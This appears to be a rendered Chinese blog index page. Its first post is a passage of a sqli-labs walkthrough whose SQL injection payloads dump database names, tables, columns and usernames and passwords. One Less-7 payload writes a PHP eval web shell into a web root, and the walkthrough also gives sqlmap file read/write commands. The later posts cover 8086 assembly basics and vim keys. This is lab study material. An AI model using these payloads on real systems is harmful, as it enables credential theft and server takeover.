+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">爆库payload</span><br><span class="line">?id&#x3D;-1&#39;union select count(*),count(*), concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line">&#x2F;&#x2F;或者</span><br><span class="line">?id&#x3D;-1&#39;union select count(*),1, concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line">&#x2F;&#x2F;注意本本方法具有随机性，原理待研究</span><br><span class="line"></span><br><span class="line">爆用户payload</span><br><span class="line">?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select user()),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">爆表名payload</span><br><span class="line">修改limit x,1 可以遍历表名，找到user这个表，猜测它存放username和password</span><br><span class="line">?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">爆字段payload</span><br><span class="line">修改limit x,1 可以遍历列名，找到username和password列</span><br><span class="line">?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">爆值payload</span><br><span class="line">修改limit x,1 可以显示第x个用户的password和username  （‘[’是分隔符）</span><br><span class="line">?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat_ws(&#39;[&#39;,password,username) from users limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-6-get字符型双注入"><a href="#Less-6-get字符型双注入" class="headerlink" title="Less-6 get字符型双注入"></a>Less-6 get字符型双注入</h3><p>如Less-5,单引号改为双引号闭合</p>
+<h3 id="Less-7-get字符型导入导出文件注入"><a href="#Less-7-get字符型导入导出文件注入" class="headerlink" title="Less-7 get字符型导入导出文件注入"></a>Less-7 get字符型导入导出文件注入</h3><blockquote>
+<p> 参考</p>
+<p> <a href="https://www.jianshu.com/p/7b9256de20d1" target="_blank" rel="noopener">https://www.jianshu.com/p/7b9256de20d1</a> </p>
+</blockquote>
+<p><strong>读写条件</strong></p>
+<p>mysql中my.ini文件修改</p>
+<p><code>secure_file_priv=&quot;&quot;</code>   可导入</p>
+<p><code>general_log = on</code>  可写</p>
+<p><strong>路径</strong></p>
+<p>winserver的iis默认路径c:\Inetpub\wwwroot<br>linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等<br>apache 就…/var/www/htm，…/var/www/html/htdocs<br>phpstudy 就是…\phpstudy_pro\WWW<br>xammp 就是…\xampp\htdocs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))  UNION SELECT 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;  into outfile &quot;D:\\phpstudy_pro\\WWW\\1.php&quot; --+</span><br></pre></td></tr></table></figure>
+
+<p>浏览器测试是否导入成功（直接查看 ）</p>
+<p>若导入成功，菜刀连接</p>
+<blockquote>
+<p>sqlmap</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -hh</span><br><span class="line">sqlmap -u &quot;注入点&quot; --file-read &quot;本地文件位置&quot;</span><br><span class="line">4444 --file-write &quot;本地文件位置&quot;</span><br><span class="line">4444 --file-dest &quot;目标文件位置&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-8-get字符型布尔盲注"><a href="#Less-8-get字符型布尔盲注" class="headerlink" title="Less-8 get字符型布尔盲注"></a>Less-8 get字符型布尔盲注</h3><p>left() 字符串截取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">left(被截取字符串， 截取长度)</span><br><span class="line">SELECT LEFT(&#39;www.yuanrengu.com&#39;,8)</span><br><span class="line">结果为：www.yuan</span><br></pre></td></tr></table></figure>
+
+<p>单引号闭合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; --+</span><br></pre></td></tr></table></figure>
+<p>测试出库名的长度，同理测出表名长度，段名长度等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and length(database())&#x3D;8 --+</span><br></pre></td></tr></table></figure>
+<p>测试出库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and left((select database()),1)&#x3D;&#39;s&#39; --+</span><br><span class="line">?id&#x3D;1&#39; and left((select database()),8)&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure>
+
+<p>测试出表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;&#39;r&#39; --+</span><br></pre></td></tr></table></figure>
+
+<p>测试出段名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),8)&#x3D;&#39;password&#39; --+</span><br></pre></td></tr></table></figure>
+
+<p>测试出password和username值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and left((select password from users order by id limit 0,1),1)&#x3D;&#39;a&#39; --+</span><br><span class="line">?id&#x3D;1&#39; and left((select username from users order by id limit 0,1),1)&#x3D;&#39;a&#39; --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-9-get字符型时间盲注"><a href="#Less-9-get字符型时间盲注" class="headerlink" title="Less-9 get字符型时间盲注"></a>Less-9 get字符型时间盲注</h3>
+      
+    </div>
+    
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
+    <a href="/categories/uncategorized/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/">
+      汇编语言入门学习
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://xaoxuu.com" target="_blank" rel="nofollow noopener">
+    <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png">
+    <p>Mr. X</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Oct 1, 2019</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p><a href="http://www.geekqanda.com/index.php/48200/现在用到汇编语言多么？学习他的意义在哪里？" target="_blank" rel="noopener"></a></p>
+</blockquote>
+<p>现在用到汇编语言多么？学习他的意义在哪里？**</p>
+<p>1.汇编语言<br>        汇编语言是最接近于机器语言的编程语言。如果说机器语言是计算机操作的本质，那么汇编语言就是最最接近本质的语言。汇编语言操作直接面向硬件，所以， 我们在使用汇编语言的时候，我们能够感知计算机的运行过程和原理，从而能够对计算机硬件和应用程序之间的联系和交互形成一个清晰的认识。这也是最能够锻炼 编程者编程思维逻辑的，只有这样，学习者才能形成一个软、硬兼备的编程知识体系，这是任何高级语言都无法给予的！相对于繁复的高级语言，汇编语言指令集合 更简约，指令操作更直接，从汇编开始学习更符合循序渐进的学习原理！所以，对于计算机技术初学者或者自学者，汇编语言重要性无可替代！</p>
+<p>2.汇编语言之于高级语言<br>　　不否认，在应用层面，高级语言占据了软件开发市场的绝大部分。也正是这种现象，误导了学习者，甚者是教育者！所以目前高校计算机专业的现状是：专业课 程中C语言，C++，java等高级语言一应俱全，而毕业的学生却连简单的程序都不能编写。为什么？听不懂，学不会！这就是缺乏基础造成的！<br>汇编语言才是计算机技术的基础，而不是常说的C语言。之所以说汇编重要，其一个重要的原因就是，汇编语言能够让你更好的理解高级语言，尤其是高级语言中的 C语言。汇编语言对于内存的操作都是基于内存地址的，而C语言中最令人头疼的指针概念，说白了就是内存的地址。指针的学习和应用中最头疼的就是在指针这个 抽象的概念和实际的内存单元之间建立思维映射，而这些恰恰是我们在汇编语言学习中频繁做的一件平常事。另外，对于C语言中的数据类型、形参实参、函数调 用、全局变量、局部变量等概念及操作，我们都可以用汇编语言中的一些操作相关联，把这些抽象的概念和过程，通过汇编语言形成一个具体的映像，深度剖析，这 样我们才能真正的学会、学好C语言。<br>　　有了汇编和C的基础，那些所谓的面向对象的语言学习起来就更为顺畅了！奉劝那些好高骛远的学习者，踏踏实实的从汇编开始吧，古云：磨刀不误砍柴工啊！ </p>
+<p>3.汇编语言之于应用<br>　　很多学习者放弃对于汇编语言的学习，是因为高级语言的开发更容易找到工作。这个理由也是我见到过的最现实的。但是，这里面明显存在着认识误区！<br>　　首先，我们的学习是一个系统过程，我们的知识结构不是一个单一课程所能够建立的。所以，学习汇编的目的并不是非要用汇编去挣饭钱。因为汇编语言对于一个编程人员所应该具备的基本素质的培养和形成得意义是非常重大的！这在前文中已经分析了，不再赘述！<br>　　其次，汇编本身也是很重要的应用技术。由于学习者，尤其是在校的学生，平时接触的最多的是纯软件的东西，所以，觉得五花八门的软件才是计算机技术应用 的舞台。那么这些人最终会成为那位博主提到的那些工作后才意识到汇编的作用的“师兄”！汇编的操作由于跟硬件紧密相关，所以，很多硬件设施的嵌入式编程使 用的都是使用的汇编语言，因为汇编语言更直接，更有效率！我们现在的数码产品很多，而这些数码产品赖以生存的芯片，主板等，都包含了嵌入式程序，而这些程 序中，汇编语言的使用是相当重要的！</p>
+<h2 id="汇编语言介绍"><a href="#汇编语言介绍" class="headerlink" title="汇编语言介绍"></a>汇编语言介绍</h2><p>汇编学习，重要的是思维，用会变的丝线，写C的程序</p>
+<p>汇编语言是除了机器语言我么所能操做的最底层语言，汇编语言是效率最高的语言。高级语言优化好的话，另当别论</p>
+<p>为什么要学汇编语言：计算机思维操作计算机</p>
+<p>反编译原理：汇编语言与机器语言是一 一对应的</p>
+<p>研究重点：利用硬件系统的编程结构和指令集，有效灵活的控制系统进行互作。</p>
+<p>机器语言：机器指令的集合，机器指令展开来讲就是一台机器可以正确执行的命令</p>
+<p>指令：（01010000）push ax</p>
+<p>电平脉冲：0┗|｀O′|┛ 嗷~~，1凸</p>
+<p>发展：一开始纸带打点，后来石英共振……，之后的发展是速度发生变化，但是是指仍然是01</p>
+<p>机器码：01…</p>
+<p>助记符：汇编相对于机器语言</p>
+<h2 id="cpu是如何以外部交流的"><a href="#cpu是如何以外部交流的" class="headerlink" title="cpu是如何以外部交流的"></a>cpu是如何以外部交流的</h2><p>每一种CPU都有自己的汇编指令集。cpu可直接在存储器中存取，在存储器中数据和指令无区别，都是二进制信息，所以放在不同的总线上就是不同的效果。</p>
+<p>汇编指令：机器码的助记符（核心，决定了特性）</p>
+<p>伪指令：编译器执行</p>
+<p>其他符号：编译器识别</p>
+<p>优秀书籍：《编码的奥秘》</p>
+<p>在磁盘与内存中，数据与指令都是二进制。</p>
+<p>cpu调用内存（磁盘调到内存），项进行数据的读写，必须和外部器件（芯片）进行三类信息的交换：</p>
+<p>存储单元的地址（地址信息）</p>
+<p>器件的选择，读写命令（控制信息）</p>
+<p>读写的数据(数据信息)</p>
+<p>物理上：一根根导线的集合 </p>
+<p>逻辑上：</p>
+<p>地址总线——–</p>
+<p>控制总线—————-                             -|        内存（存储芯片）    |</p>
+<p>数据总线—————-                               -|——————–</p>
+<p>64位的要求为，cpu,操作系统，软件 都要是64位，那么才能达到64位的处理速度。</p>
+<p>64位就是64条地址总线，可对64个存储单元进行寻址；地址总线的宽度为64，可以寻址2^64（寻址能力）;</p>
+<p>地址从上到下由低到高，一个地址总线可以索引一个内存单元也就是一个字节，一个字节八位。</p>
+<p>数据总线 的宽度决定了cpu和外界的数据传送速度</p>
+<p>8088：8</p>
+<p>8086：16</p>
+<p>控制总线是个总称，是一些不同控制线的集合，宽度决定了控制能力 ，一条线01（负电压）决定读写。</p>
+<p>例如：从三号单元数据放到ax。</p>
+<p>优秀书籍：《C的缺陷与陷阱》</p>
+<p>存储器芯片：</p>
+<p>读写属性分类：ram随机存储器，rom只读存储器。</p>
+<p>从功能和连接上分类：随机存储器ram,装有BIOS的rom（各种接口卡，主板都有BIOS）,接口卡上的ram</p>
+<p><img src="D:%5C0dong%5Cblog%5Csource%5Cimages%5C1570000896914.png" alt="1570000896914"></p>
+<p> <img src="D:%5C0dong%5Cblog%5Csource%5Cimages%5C1570004911229.png" alt="1570004911229"></p>
+<p>核心：以汇编语言的思维来编程，汇编编程时，从cpu的角度出发。</p>
+<h2 id="cpu内部工作原理"><a href="#cpu内部工作原理" class="headerlink" title="cpu内部工作原理"></a>cpu内部工作原理</h2><p>一个典型的cpu 有计算器，控制器，寄存器的器件组成，这些器件是靠内部总线相连</p>
+<p>区别：内部总线连接cpu内部器件，外部总线连接cpu 与主板上的其他器件</p>
+<p>8086cpu有14个寄存器：AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW</p>
+<p>8086(16bit)通用寄存器ax(ah,al)向下兼容</p>
+<p>字在寄存器中的存储，一个字2字节。</p>
+<p>汇编指令不区分大小写</p>
+<p>先介绍俩个指令</p>
+<blockquote>
+<p>mov </p>
+<p>功能：将数据直接送入寄存器（mov ax,1000），将一个寄存器中的内容送入另一个寄存器中(mov ax,bx)</p>
+<p>add 加</p>
+</blockquote>
+<h3 id="16位结构的cpu特征"><a href="#16位结构的cpu特征" class="headerlink" title="16位结构的cpu特征"></a>16位结构的cpu特征</h3><p>运算器一次最多可以处理16位的数据</p>
+<p>寄存器的最大宽度为16位</p>
+<p>寄存器和运算器之间的通路为16位的</p>
+<p>8086外部有20位地址总线，可传送20位地址，寻址能力为1M; 内部为16位结构，他只能传送16位的地址，表现出的寻址能力却只有64K.</p>
+<p> 地址加法器：物理地址=段地址*16+偏移地址</p>
+<h3 id="段的概念"><a href="#段的概念" class="headerlink" title="段的概念"></a>段的概念</h3><p>将一组内存单元定义为段</p>
+<p>内存并没有分段，段的划分来自于cpu（cpu将段地址和偏移地址交给地址加法器）,后在编程中根据需要，将若干的地址联系的内存单元看作一个段，用段地址*16定位段的起始地址（基础地址），用偏移地址定位段中的内存单元。</p>
+<p>数据在21f60H内存单元，对于8086pc机上的两种描述：</p>
+<p>数据存在内存2000:1f60单元中；常用</p>
+<p>数据存在内存的2000段中的1f60H单元中</p>
+<p>段地址的选出：根据需要，将地址连续，起始地址为16的倍数的一组内存单元定义为一个段。</p>
+<h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>段寄存器就是提供段地址的。</p>
+<p>8086cpu有4个段寄存器：</p>
+<p>cs(代码段地址寄存器)</p>
+<p>ds（数据段）</p>
+<p>ss（堆栈段）</p>
+<p>es（附加段）</p>
+<h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><p>cs,ip人规定始位置</p>
+<h3 id="cs和ip"><a href="#cs和ip" class="headerlink" title="cs和ip"></a>cs和ip</h3><p>cs和ip是8086cpu中做关键的寄存器，他们指示了cpu当前读取指令的地址。</p>
+<p>cs为代码段寄存器</p>
+<p>ip为指令指针寄存器</p>
+<p><img src="D:%5C0dong%5Cblog%5Csource%5Cimages%5C1570080646781.png" alt="1570080646781"></p>
+<p>  在任何时候，cpu将cs,ip中的内容当作段地址和偏移地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp ax #修改ip</span><br><span class="line"></span><br><span class="line">jmp 1000:3 #修改cs 和 ip</span><br></pre></td></tr></table></figure>
+
+<p> 蓝屏一般是内存问题，卡死，死机一般是cpu问题。 </p>
+<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>只是个调试程序</p>
+<p><img src="D:%5C0dong%5Cblog%5Csource%5Cimages%5C1570089168919.png" alt="1570089168919"></p>
+<h2 id="寄存器内存访问"><a href="#寄存器内存访问" class="headerlink" title="寄存器内存访问"></a>寄存器内存访问</h2><h3 id="字单元"><a href="#字单元" class="headerlink" title="字单元"></a>字单元</h3><p>N和n+1号字节单元（低地址和高地址）</p>
+<h3 id="ds"><a href="#ds" class="headerlink" title="ds"></a>ds</h3><p>8086pc中，内存地址由段地址和偏移地址组成，ds寄存器存放要访问的数据的段地址。</p>
+<p>下列命令将10000H（1000:0）中的数据读到al中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx 1000</span><br><span class="line">mov bs bx</span><br><span class="line">mov al,[0]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>mov al,[0]  将0这个偏移地址中的内容送入al中</p>
+<p>增加功能：将一个内存单元中的内容送入一个寄存器。</p>
+<p>[0]    中的0表示偏移地址，段地址在bs中（8086cpu自动获取ds中的数据为内存单元的段地址）</p>
+<p>不能直接把1000H直接送给ds,要通过通用寄存器（硬件设计）</p>
+</blockquote>
+<p>将al中的数据送到10000H中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx 1000</span><br><span class="line">mov bs bx</span><br><span class="line">mov [0],al</span><br></pre></td></tr></table></figure>
+
+<h3 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h3><p>8086cpu是16位的，注意区分字和字节 </p>
+<h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><p>形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov 寄存器， 数据</span><br><span class="line">mov 寄存器， 寄存器</span><br><span class="line">mov 寄存器， 内存单元</span><br><span class="line">mov 内存单元， 寄存器</span><br><span class="line">mov 段寄存器, 寄存器</span><br><span class="line">mov 寄存器, 段寄存器</span><br></pre></td></tr></table></figure>
+
+<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add 寄存器， 数据</span><br><span class="line">add 寄存器，寄存器</span><br><span class="line">add 寄存器， 内存单元</span><br><span class="line">add 内存单元， 寄存器</span><br></pre></td></tr></table></figure>
+
+<h3 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h3><p>减</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub ax, bx  # ax&#x3D;ax-bx</span><br></pre></td></tr></table></figure>
+
+<h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p>定义一组内存单元存数据，ds</p>
+<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>栈是内存中的数据结构,下高地址，上高地址，方便临时存储数据而存在（内部函数）</p>
+<p>8086以字为单位</p>
+<blockquote>
+<p>push ax ax中的数据送入栈</p>
+<p>pop ax 从栈顶取出数据送入ax</p>
+</blockquote>
+<h3 id="ss和sp"><a href="#ss和sp" class="headerlink" title="ss和sp"></a>ss和sp</h3><p>指向栈顶元素，8086cpu只记录栈顶</p>
+<h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>实质是内存传送指令</p>
+<p>入栈,sp-2，放入数据</p>
+<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>出栈，拿出数据，sp+2,指向新的栈顶，但是原栈顶位置数据仍然存在；再次执行push命令后，它将被覆盖。</p>
+<p>push和pop指令是可以在寄存器和内存之间传送数据的 </p>
+<p>栈顶越界问题：溢出，危险</p>
+<p>栈顶上限下限寄存器，然而8086cpu中并没有这样的寄存器</p>
+<p>8086cpu的互作机理，只考虑当前的情况：当前栈顶在何处，当前要执行的指令是哪一条，栈空间是人自己限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 通用寄存器</span><br><span class="line">push 段寄存器 #将一个段寄存器中的数据入栈</span><br><span class="line">push 内存单元 #push [1]</span><br><span class="line">pop ...</span><br></pre></td></tr></table></figure>
+
+<h3 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h3><p>ss,sp规定</p>
+<h2 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:程序...</span><br><span class="line">4......</span><br><span class="line">4......</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
+
+<p><img src="1570204073027.png" alt="1570204073027"></p>
+<p><img src="1570204427690.png" alt="1570204427690"></p>
+<h3 id="cx"><a href="#cx" class="headerlink" title="cx"></a>cx</h3><p>存程序的机器码长度</p>
+<p><img src="1570246436247.png" alt="1570246436247"></p>
+<p>ds和cs之间有的空余  </p>
+<p>debug程序，t一步一步执行，p来执行int 21,或者，g一步执行到底。</p>
+<h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="bx"><a href="#bx" class="headerlink" title="bx"></a>bx</h3><p>在masm和debug中写程序是不一样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 1000</span><br><span class="line">mov ds, ax</span><br><span class="line">mov al, [1]</span><br></pre></td></tr></table></figure>
+
+<p>在masm中就会被当作1，放入al中，debug中会把10000H处的数据放入到al中。</p>
+<p>所以在masm编译器中，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 1000</span><br><span class="line">mov ds, ax</span><br><span class="line">mov bx, 1</span><br><span class="line">mov al, [bx]</span><br></pre></td></tr></table></figure>
+
+<h3 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h3>
+      
+    </div>
+    
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
+    <a href="/categories/%E5%B7%A5%E5%85%B7/vim%E5%B8%B8%E7%94%A8/">
+      vim常用
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://xaoxuu.com" target="_blank" rel="nofollow noopener">
+    <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png">
+    <p>Mr. X</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/%E5%B7%A5%E5%85%B7/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>工具</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Sep 29, 2019</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>简单介绍常用的按键</p>
+<table>
+<thead>
+<tr>
+<th>按键</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>e</td>
+<td align="left">字首</td>
+</tr>
+<tr>
+<td>b</td>
+<td align="left">字尾</td>
+</tr>
+<tr>
+<td>a</td>
+<td align="left">光标前insert</td>
+</tr>
+<tr>
+<td>i</td>
+<td align="left">光标后insert</td>
+</tr>
+<tr>
+<td>u</td>
+<td align="left">撤销</td>
+</tr>
+<tr>
+<td>U</td>
+<td align="left">撤销光标所在行的修改，本质是修改，可用u撤回</td>
+</tr>
+<tr>
+<td>$</td>
+<td align="left">行尾</td>
+</tr>
+<tr>
+<td>0</td>
+<td align="left">行首</td>
+</tr>
+<tr>
+<td>J</td>
+<td align="left">去除本行换行符</td>
+</tr>
+<tr>
+<td>x</td>
+<td align="left">删除</td>
+</tr>
+<tr>
+<td>s</td>
+<td align="left">删除，并进入insert状态</td>
+</tr>
+<tr>
+<td>dd</td>
+<td align="left">删除光标所在行</td>
+</tr>
+<tr>
+<td>/</td>
+<td align="left">查找</td>
+</tr>
+<tr>
+<td>n</td>
+<td align="left">向下查找</td>
+</tr>
+<tr>
+<td>N</td>
+<td align="left">向上查找</td>
+</tr>
+<tr>
+<td>h</td>
+<td align="left">左</td>
+</tr>
+<tr>
+<td>j</td>
+<td align="left">下</td>
+</tr>
+<tr>
+<td>k</td>
+<td align="left">上</td>
+</tr>
+<tr>
+<td>l</td>
+<td align="left">右</td>
+</tr>
+<tr>
+<td>yy</td>
+<td align="left">复制光标所在行</td>
+</tr>
+<tr>
+<td>nyy</td>
+<td align="left">从光标处开始复制n行</td>
+</tr>
+<tr>
+<td>p</td>
+<td align="left">在光标处粘贴行</td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+    
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
+    <a href="/categories/Web%E5%AE%89%E5%85%A8/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/">
+      端口扫描
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://xaoxuu.com" target="_blank" rel="nofollow noopener">
+    <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png">
+    <p>Mr. X</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/Web%E5%AE%89%E5%85%A8/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>Web安全</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Sep 11, 2019</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>端口扫描工具</p>
+      
+    </div>
+    
+      
+        <div class="button readmore">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/">
+            Read More <i class="fas fa-chevron-right"></i>
+          </a>
+        </div>
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
